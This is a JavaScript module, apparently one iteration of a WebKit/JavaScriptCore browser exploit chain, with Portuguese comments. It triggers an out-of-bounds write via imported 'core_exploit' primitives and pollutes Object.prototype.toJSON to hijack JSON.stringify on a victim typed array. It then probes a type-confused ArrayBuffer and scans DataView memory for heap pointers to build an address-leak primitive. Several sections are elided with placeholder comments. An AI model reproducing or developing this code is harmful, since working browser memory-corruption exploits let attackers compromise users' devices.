// js/script3/testArrayBufferVictimCrash.mjs (v67_InspectPromiseConfusedAB)

import { logS3, PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, toHex } from '../utils.mjs';
import {
    triggerOOB_primitive,
    oob_write_absolute,
    clearOOBEnvironment,
    getStableConfusedArrayBuffer
} from '../core_exploit.mjs';
import { JSC_OFFSETS } from '../config.mjs';

export const FNAME_MODULE_TYPEDARRAY_ADDROF_V67_IPCAB = "OriginalHeisenbug_TypedArrayAddrof_v67_InspectPromiseConfusedAB";

// Variáveis globais/módulo
let captured_props_for_ConfusedAB_as_Promise_v67 = null; // Para propriedades da Promise
let captured_fuzz_for_NormalDV_v67 = null;

let leak_target_confused_ab_v67 = null;
let leak_target_normal_dv_v67 = null;
let victim_typed_array_ref_v67 = null;
let probe_call_count_v67 = 0;
let all_probe_interaction_details_v67 = [];
let first_call_details_object_ref_v67 = null;

const VICTIM_BUFFER_SIZE = 256;
const LOCAL_HEISENBUG_CRITICAL_WRITE_OFFSET = 0x7C;
const OOB_WRITE_VALUE = 0xFFFFFFFF;
const PROBE_CALL_LIMIT_V67 = 10;
const FUZZ_OFFSETS_V67 = [0x00, 0x08, 0x10, 0x18, 0x20, 0x28, 0x30, 0x38]; // Menos offsets para simplificar

function toJSON_TA_Probe_InspectPromiseConfusedAB_v67() {
    probe_call_count_v67++;
    const call_num = probe_call_count_v67;
    let current_call_details = {
        call_number: call_num,
        probe_variant: FNAME_MODULE_TYPEDARRAY_ADDROF_V67_IPCAB,
        this_type: Object.prototype.toString.call(this),
        this_is_victim: (this === victim_typed_array_ref_v67),
        this_is_C1: (this === first_call_details_object_ref_v67 && first_call_details_object_ref_v67 !== null),
        this_is_ConfusedAB: (this === leak_target_confused_ab_v67 && leak_target_confused_ab_v67 !== null),
        this_is_NormalDV: (this === leak_target_normal_dv_v67 && leak_target_normal_dv_v67 !== null),
        inspection_info: null,
        error_in_probe: null
    };
    logS3(`[${current_call_details.probe_variant}] Call #${call_num}. Type: ${current_call_details.this_type}. IsVictim? ${current_call_details.this_is_victim}. IsC1? ${current_call_details.this_is_C1}. IsConfusedAB? ${current_call_details.this_is_ConfusedAB}. IsNormalDV? ${current_call_details.this_is_NormalDV}`, "leak");

    try {
        if (call_num > PROBE_CALL_LIMIT_V67) { /* ... stop recursion ... */ }

        if (call_num === 1 && current_call_details.this_is_victim) {
            logS3(`[${current_call_details.probe_variant}] Call #${call_num}: Victim. Creating C1_details w/ payloads.`, "info");
            first_call_details_object_ref_v67 = current_call_details;
            current_call_details.payload_ConfusedAB = leak_target_confused_ab_v67; // Pode ser null se getStable falhou
            current_call_details.payload_NormalDV = leak_target_normal_dv_v67;
            all_probe_interaction_details_v67.push({...current_call_details});
            return current_call_details;
        }
        // CASO PRINCIPAL: 'this' é o ConfusedAB E seu tipo é [object Promise]
        else if (current_call_details.this_is_ConfusedAB && current_call_details.this_type === '[object Promise]') {
            logS3(`[${current_call_details.probe_variant}] Call #${call_num}: 'this' IS ConfusedAB AND TYPE IS [object Promise]! Inspecting...`, "critical");
            let properties = {};
            try {
                for (const key in this) { // Tenta listar propriedades enumeráveis
                    if (Object.prototype.hasOwnProperty.call(this, key)) {
                        properties[key] = String(this[key]).substring(0, 64); // Converte para string e trunca
                    }
                }
                // Tentar acessar 'then' como um teste de funcionalidade da Promise
                properties['then_exists'] = (typeof this.then === 'function');
                properties['catch_exists'] = (typeof this.catch === 'function');
                properties['finally_exists'] = (typeof this.finally === 'function');

                current_call_details.inspection_info = { type: "[object Promise]", properties: properties };
                captured_props_for_ConfusedAB_as_Promise_v67 = properties; // Captura para canal lateral
                logS3(`[${current_call_details.probe_variant}] Inspected ConfusedAB (as Promise): ${JSON.stringify(properties)}`, "vuln");

            } catch (e_inspect) {
                logS3(`[${current_call_details.probe_variant}] Error inspecting Promise: ${e_inspect.message}`, "error");
                current_call_details.error_in_probe = e_inspect.message;
                current_call_details.inspection_info = { type: "[object Promise]", error: e_inspect.message };
                captured_props_for_ConfusedAB_as_Promise_v67 = { error: e_inspect.message };
            }
            all_probe_interaction_details_v67.push({...current_call_details});
            return { marker_confused_ab_as_promise_v67: true, call_num_processed: call_num, observed_type: current_call_details.this_type, reported_props: properties };
        }
        // Fallback: 'this' é o ConfusedAB mas ainda como ArrayBuffer (se a confusão para Promise não ocorreu)
        else if (current_call_details.this_is_ConfusedAB && current_call_details.this_type === '[object ArrayBuffer]') {
            logS3(`[${current_call_details.probe_variant}] Call #${call_num}: 'this' IS ConfusedAB (as ArrayBuffer). Logging and returning marker. (Fuzzing TBD).`, "warn");
            // Para esta versão, não faremos fuzzing aqui, apenas marcaremos que ele foi visto como AB.
            current_call_details.inspection_info = "ConfusedAB seen as ArrayBuffer. No fuzzing in this path for v67.";
            captured_props_for_ConfusedAB_as_Promise_v67 = { type_is_arraybuffer: true }; // Sinaliza que não virou Promise
            all_probe_interaction_details_v67.push({...current_call_details});
            return { marker_confused_ab_as_ab_v67: true, call_num_processed: call_num };
        }
        else if (current_call_details.this_is_NormalDV && current_call_details.this_type === '[object DataView]') {
            logS3(`[${current_call_details.probe_variant}] Call #${call_num}: 'this' IS NormalDV! Fuzzing for control...`, "info");
            let fuzzed_reads = []; // Fuzzing do NormalDV mantido como controle
            try {
                let view = this;
                for (const offset of FUZZ_OFFSETS_V67) { /* ... (lógica de fuzzing igual à v64 para NormalDV) ... */
                    let low=0,high=0,ptr_str="N/A",dbl=NaN,err_msg=null; if(view.byteLength<(offset+8)){err_msg="OOB";}else{low=view.getUint32(offset,true);high=view.getUint32(offset+4,true);ptr_str=new AdvancedInt64(low,high).toString(true);let tb=new ArrayBuffer(8);(new Uint32Array(tb))[0]=low;(new Uint32Array(tb))[1]=high;dbl=(new Float64Array(tb))[0];} fuzzed_reads.push({offset:toHex(offset),low:toHex(low),high:toHex(high),int64:ptr_str,dbl:dbl,error:err_msg}); logS3(`    NormalDV Fuzz@${toHex(offset)}: L=${toHex(low)} H=${toHex(high)} I64=${ptr_str} D=${dbl}${err_msg?' E:'+err_msg:''}`,"dev_verbose");
                }
                captured_fuzz_for_NormalDV_v67 = fuzzed_reads;
                current_call_details.fuzz_capture_info = `NormalDV Fuzz captured ${fuzzed_reads.length} reads.`;
                logS3(`[${current_call_details.probe_variant}] ${current_call_details.fuzz_capture_info}`, "info"); // Mudado de vuln para info
            } catch (e) { current_call_details.error_in_probe = e.message; /* ... */ }
            all_probe_interaction_details_v67.push({...current_call_details});
            return { marker_normal_dv_fuzz_done_v67: true, call_num_processed: call_num };
        }
        // ... (outros casos como C1 re-entry e unexpected)
        else if (current_call_details.this_is_C1 && current_call_details.this_type === '[object Object]') {
            logS3(`[${current_call_details.probe_variant}] Call #${call_num}: 'this' is C1 (re-entry). Not modifying.`, "warn");
            all_probe_interaction_details_v67.push({...current_call_details});
            return this;
        } else {
            logS3(`[${current_call_details.probe_variant}] Call #${call_num}: 'this' is unexpected: ${current_call_details.this_type}. Ret marker.`, "warn");
            all_probe_interaction_details_v67.push({...current_call_details});
            return `ProcessedCall${call_num}_Type${current_call_details.this_type.replace(/[^a-zA-Z0-9]/g, '')}`;
        }
    } catch (e_probe) { /* ... (tratamento de erro geral da sonda) ... */ }
}

export async function executeTypedArrayVictimAddrofTest_InspectPromiseConfusedAB() {
    const FNAME_CURRENT_TEST = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V67_IPCAB}.triggerAndLog`;
    logS3(`--- Iniciando ${FNAME_CURRENT_TEST}: Heisenbug (InspectPromiseConfusedAB) & Addrof ---`, "test", FNAME_CURRENT_TEST);
    document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V67_IPCAB} Init...`;

    // Resetar variáveis de captura e estado
    captured_props_for_ConfusedAB_as_Promise_v67 = null;
    captured_fuzz_for_NormalDV_v67 = null;
    probe_call_count_v67 = 0;
    all_probe_interaction_details_v67 = []; // Resetado aqui
    victim_typed_array_ref_v67 = null;
    first_call_details_object_ref_v67 = null;

    let tempOriginalToJSON_getter = Object.getOwnPropertyDescriptor(Object.prototype, 'toJSON');
    logS3(`[${FNAME_CURRENT_TEST}] Tentando obter Confused ArrayBuffer do core_exploit...`, "info");
    leak_target_confused_ab_v67 = getStableConfusedArrayBuffer(); // Chamada síncrona assumida
    // Restaurar toJSON imediatamente se getStableConfusedArrayBuffer o poluiu
    if (tempOriginalToJSON_getter) Object.defineProperty(Object.prototype, 'toJSON', tempOriginalToJSON_getter);
    else delete Object.prototype.toJSON;

    let confusedAB_log_type = "null_or_failed_generation";
    if (leak_target_confused_ab_v67) {
        confusedAB_log_type = Object.prototype.toString.call(leak_target_confused_ab_v67);
        logS3(`[${FNAME_CURRENT_TEST}] Confused ArrayBuffer (leak_target_confused_ab_v67) obtido. Tipo inicial: ${confusedAB_log_type}`, "info");
    } else {
        logS3(`[${FNAME_CURRENT_TEST}] FALHA AO OBTER Confused ArrayBuffer do core_exploit. leak_target_confused_ab_v67 é null. Usando fallback.`, "warn");
        leak_target_confused_ab_v67 = new ArrayBuffer(0x10); // Fallback para um AB normal PEQUENO para diferenciar
    }
    leak_target_normal_dv_v67 = new DataView(new ArrayBuffer(0x80));

    let errorCapturedMain = null;
    let rawStringifyOutput = "N/A", stringifyOutput_parsed = null;
    let collected_probe_details_for_return = [];
    let addrof_A_result = { success: false, msg: "Addrof ConfusedAB/Promise: Default (v67)" };
    let addrof_B_result = { success: false, msg: "Addrof NormalDV: Default (v67)" };
    let pollutionApplied = false, originalToJSONDescriptor = null;

    try {
        await triggerOOB_primitive({ force_reinit: true }); // Força reinit para o teste principal
        oob_write_absolute(LOCAL_HEISENBUG_CRITICAL_WRITE_OFFSET, OOB_WRITE_VALUE, 4);
        logS3(`  Critical OOB write for main test to ${toHex(LOCAL_HEISENBUG_CRITICAL_WRITE_OFFSET)}.`, "info", FNAME_CURRENT_TEST);
        await PAUSE_S3(100);
        victim_typed_array_ref_v67 = new Uint8Array(new ArrayBuffer(VICTIM_BUFFER_SIZE));

        const ppKey = 'toJSON';
        originalToJSONDescriptor = Object.getOwnPropertyDescriptor(Object.prototype, ppKey);
        try {
            Object.defineProperty(Object.prototype, ppKey, { value: toJSON_TA_Probe_InspectPromiseConfusedAB_v67, writable: true, configurable: true, enumerable: false });
            pollutionApplied = true;
            logS3(`  Object.prototype.toJSON polluted. Calling JSON.stringify(victim_typed_array_ref_v67)...`, "info", FNAME_CURRENT_TEST);
            rawStringifyOutput = JSON.stringify(victim_typed_array_ref_v67);
            logS3(`  JSON.stringify completed. Raw Output: ${rawStringifyOutput}`, "info");
            try{ stringifyOutput_parsed = JSON.parse(rawStringifyOutput); } catch(e){ /* ... */ }

            logS3("STEP 3: Analyzing captured data from side-channels (v67)...", "warn", FNAME_CURRENT_TEST);
            let heisenbugIndication = false;

            if (captured_props_for_ConfusedAB_as_Promise_v67) {
                heisenbugIndication = true;
                logS3(`  V67_ANALYSIS: Captured properties/info for ConfusedAB (as Promise): ${JSON.stringify(captured_props_for_ConfusedAB_as_Promise_v67)}`, "good");
                if (captured_props_for_ConfusedAB_as_Promise_v67.type_is_arraybuffer) {
                     addrof_A_result.msg = "V67 ConfusedAB remained ArrayBuffer, not Promise. No fuzzing done in that path.";
                } else if (captured_props_for_ConfusedAB_as_Promise_v67.error) {
                     addrof_A_result.msg = `V67 Error inspecting Promise: ${captured_props_for_ConfusedAB_as_Promise_v67.error}`;
                } else {
                    // Aqui poderíamos tentar interpretar as 'properties' se elas contivessem algo útil,
                    // mas para v67, o foco é confirmar o estado e a captura.
                    addrof_A_result.msg = `V67 ConfusedAB became Promise. Properties: ${Object.keys(captured_props_for_ConfusedAB_as_Promise_v67.properties || {}).join(',')}`;
                }
            } else if (!addrof_A_result.success) {
                addrof_A_result.msg = "V67 No properties captured for ConfusedAB.";
            }

            // Processar fuzzing do NormalDV (controle)
            const process_fuzz = (fuzz_data, adr_res, typeName) => { /* ... (mesma lógica da v64) ... */
                 if (fuzz_data && Array.isArray(fuzz_data)) {
                    if(!heisenbugIndication && fuzz_data.length > 0) heisenbugIndication = true; // Se fuzz ocorreu, é uma indicação
                    logS3(`  V67_ANALYSIS: Processing ${fuzz_data.length} captured fuzz reads for ${typeName}.`, "info");
                    for (const r of fuzz_data) { if (r.error) continue; const hV=parseInt(r.high,16), lV=parseInt(r.low,16); let isPtr=false; if(JSC_OFFSETS.JSValue?.HEAP_POINTER_TAG_HIGH!==undefined){isPtr=(hV===JSC_OFFSETS.JSValue.HEAP_POINTER_TAG_HIGH&&(lV&JSC_OFFSETS.JSValue.TAG_MASK)===JSC_OFFSETS.JSValue.CELL_TAG);} if(!isPtr&&(hV>0||lV>0x10000)&&(hV<0x000F0000)&&((lV&0x7)===0)){isPtr=true;} if(isPtr&&!(hV===0&&lV===0)){adr_res.success=true;adr_res.msg=`V67 SUCCESS (${typeName}): Ptr ${r.int64} @${r.offset}`;logS3(` !!!! V67 POINTER for ${typeName} @${r.offset}: ${r.int64} !!!!`,"vuln");break;}}
                    if(!adr_res.success){adr_res.msg=`V67 Fuzz for ${typeName} no ptr. First: ${fuzz_data[0]?.int64||'N/A'}`;}
                } else if (!adr_res.success){adr_res.msg=`V67 No fuzz data for ${typeName}.`;}
            };
            process_fuzz(captured_fuzz_for_NormalDV_v67, addrof_B_result, "NormalDV (Control)");


            if(addrof_A_result.success||addrof_B_result.success){document.title=`${FNAME_MODULE_TYPEDARRAY_ADDROF_V67_IPCAB}: Addr SUCCESS!`;}
            else if(heisenbugIndication){document.title=`${FNAME_MODULE_TYPEDARRAY_ADDROF_V67_IPCAB}: Heisenbug OK, Addr Fail`;}
            else{document.title=`${FNAME_MODULE_TYPEDARRAY_ADDROF_V67_IPCAB}: No Heisenbug?`;}

        } catch (e) { errorCapturedMain = e; /* ... */ } finally { /* ... */ }
    } catch (e) { errorCapturedMain = e; /* ... */ }
    finally {
        collected_probe_details_for_return = all_probe_interaction_details_v67.map(d=>({...d}));
        clearOOBEnvironment({force_clear_even_if_not_setup: true});
        logS3(`--- ${FNAME_CURRENT_TEST} Completed ---`, "test", FNAME_CURRENT_TEST);
        logS3(`Total probe calls: ${probe_call_count_v67}`, "info", FNAME_CURRENT_TEST);
        logS3(`Addrof A (ConfusedAB/Promise): Success=${addrof_A_result.success}, Msg='${addrof_A_result.msg}'`, addrof_A_result.success ? "good" : "warn", FNAME_CURRENT_TEST);
        logS3(`Addrof B (NormalDV): Success=${addrof_B_result.success}, Msg='${addrof_B_result.msg}'`, addrof_B_result.success ? "good" : "warn", FNAME_CURRENT_TEST);
        // ... (limpeza de globais)
    }
    return { /* ... objeto de resultado ... */ };
};
